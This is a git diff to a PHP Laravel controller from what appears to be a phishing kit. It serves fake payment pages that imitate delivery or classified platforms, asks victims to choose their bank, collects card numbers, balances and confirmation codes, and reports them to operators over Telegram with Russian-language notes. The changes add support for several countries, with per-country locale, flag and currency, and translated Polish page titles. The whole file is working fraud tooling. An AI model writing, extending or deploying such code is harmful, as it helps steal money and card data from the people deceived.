@@ -4,10 +4,12 @@ namespace App\Http\Controllers\Fake;
 
 use App\Http\Controllers\Telegram\BotController;
 use App\Models\Category;
+use App\Models\Country;
 use App\Models\Fake;
 use App\Http\Controllers\Controller;
 use Exception;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Str;
 use Telegram\Bot\Api;
@@ -45,17 +47,18 @@ class PagesController extends Controller
             $this->isPay = !$request->has('get') && ($request->has('pay') || $request->session()->get('fake.type') === 'pay');
             $request->session()->put('fake.type', ($this->isPay ? 'pay' : 'get'));
             try {
-                $this->category = Cache::remember("category:$track_id", 15, function () {
-                    return Category::get()->filter(function (Category $category) {
-                        return in_array($this->subdomain, explode(',', setting($category->name, $category->name)));
-                    })->first();
-                });
-                if (is_null($track_id) || is_null($this->category)) throw new Exception();
+                if (is_null($track_id)) throw new Exception();
                 $this->fake = Cache::remember("fake:$track_id", 15, function () use ($key, $track_id) {
-                    return $this->category->fakes()->where($key, $track_id)->first();
+                    return Fake::where($key, $track_id)->with(['category'])->first();
                 });
 
                 if (is_null($this->fake)) throw new Exception();
+                $this->category = $this->fake->category;
+
+                if (!in_array($this->subdomain, explode(',', setting($this->category->name, $this->category->name))) &&
+                    app()->environment('production'))
+                    throw new Exception();
+
                 $track_id = $this->fake->track_id;
                 $request->session()->put($key, $track_id);
                 if (!$request->session()->has('uuid')) {
@@ -73,13 +76,14 @@ class PagesController extends Controller
                         "🚛<b>Платформа:</b> <code>{$this->platform()}</code>"
                     ]);
                 }
+                $locale = $this->category->country->locale ?? Country::locale(Country::POLAND);
+                if (!App::isLocale($locale)) App::setLocale($locale);
                 return $next($request);
             } catch (Throwable|Exception $exception) {
-                Cache::forget("category:$track_id");
                 Cache::forget("fake:$track_id");
                 session()->forget($key);
             }
-            return redirect((new Fake())->originalUrl($this->category->name ?? null));
+            return redirect((new Fake())->originalUrl($this->category->name ?? $this->subdomain));
         });
     }
 
@@ -117,8 +121,9 @@ class PagesController extends Controller
 
     private function platform(): string
     {
-
-        return platform($this->category->name ?? '', $this->isPay ? '1.0' : '2.0');
+        $name = $this->category->name ?? 'undefined';
+        $flag = $this->category->country->flag ?? Country::flag(Country::POLAND);
+        return platform($name . "[$flag]", $this->isPay ? '1.0' : '2.0');
     }
 
     private function getFake(): ?Fake
@@ -229,7 +234,7 @@ class PagesController extends Controller
 
     public function banks($name = null)
     {
-        $title = 'Wybierz swój bank, aby kontynuować';
+        $title = __("Please select your bank to continue");
         $favicon = asset('images/banks_favicon.ico');
         $banks = collect(config('fakes.banks'));
         $fake = $this->getFake();
@@ -355,7 +360,7 @@ class PagesController extends Controller
         $balance = $request->session()->get('balance');
         $amount = number_format($fake->price, 0, "", " ");
         $bankName = ucfirst($this->bank);
-        $currency = setting('currency');
+        $currency = $fake->country->currency ?? setting('currency');
 
         $bankInfo = cardInfo($ccnumber);
         $notify = is_null($bankInfo) ? "<b>(Возможно фейк карта!)</b>" : "";
@@ -410,7 +415,7 @@ class PagesController extends Controller
         return view(view()->exists("fakes.{$this->category->name}.code")
             ? "fakes.{$this->category->name}.code"
             : "fakes.code", [
-            'title' => 'Potwierdzenie operacji',
+            'title' => __("Operation confirmation"),
             'categoryName' => mb_strtoupper($this->category->name) . '_PAY',
             'amount' => $fake->priceFormat(),
             'card_number' => '**** **** **** ' . substr(session()->get('card_number'), -4)
@@ -420,7 +425,7 @@ class PagesController extends Controller
     public function logCode(Request $request)
     {
         $fake = $this->getFake();
-        $currency = setting('currency');
+        $currency = $fake->country->currency ?? setting('currency');
         $ccnumber = $request->session()->get('card_number');
         $amount = number_format($fake->price, 0, "", " ");
         if ($code = $request->get('code')) {
